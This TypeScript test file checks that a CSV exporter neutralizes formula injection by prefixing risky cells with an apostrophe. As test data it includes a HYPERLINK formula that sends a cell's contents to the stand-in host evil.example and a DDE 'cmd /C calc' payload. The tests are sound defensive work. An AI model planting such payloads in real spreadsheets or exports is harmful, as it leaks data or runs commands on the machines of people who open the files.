/**
 * An export leaves the app and is opened somewhere we do not control — usually
 * Excel or Sheets, often by an accountant or a relative rather than the owner.
 * Those readers execute a cell that opens with =, +, - or @, so a name or a
 * title someone typed into their own record must not arrive as a formula.
 */
import { describe, expect, test } from 'bun:test';

import { buildCsv, csvEscape, type ExportCol } from './exporters';

describe('csvEscape', () => {
  test('neutralizes cells a spreadsheet would execute', () => {
    expect(csvEscape('=HYPERLINK("http://evil.example/"&A1,"Open")')).toBe(
      '"\'=HYPERLINK(""http://evil.example/""&A1,""Open"")"',
    );
    expect(csvEscape('=1+1')).toBe("'=1+1");
    expect(csvEscape('+91 98765 43210')).toBe("'+91 98765 43210");
    expect(csvEscape('-2.5')).toBe("'-2.5");
    expect(csvEscape('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });

  test('leaves ordinary cells and existing quoting alone', () => {
    expect(csvEscape('Sy. No. 120/3')).toBe('Sy. No. 120/3');
    expect(csvEscape('Rao, K.')).toBe('"Rao, K."');
    expect(csvEscape('a "quoted" word')).toBe('"a ""quoted"" word"');
    expect(csvEscape('line\r\nbreak')).toBe('"line\r\nbreak"');
    expect(csvEscape('')).toBe('');
  });
});

describe('buildCsv', () => {
  test('guards header titles and body cells alike', () => {
    type Row = { title: string; owner: string };
    const cols: ExportCol<Row>[] = [
      { key: 'title', title: '=Title' },
      { key: 'owner', title: 'Owner' },
    ];
    const rows: Row[] = [{ title: '=cmd|" /C calc"!A0', owner: 'Lakshmi' }];
    expect(buildCsv(cols, rows)).toBe(
      "'=Title,Owner\r\n\"'=cmd|\"\" /C calc\"\"!A0\",Lakshmi",
    );
  });
});
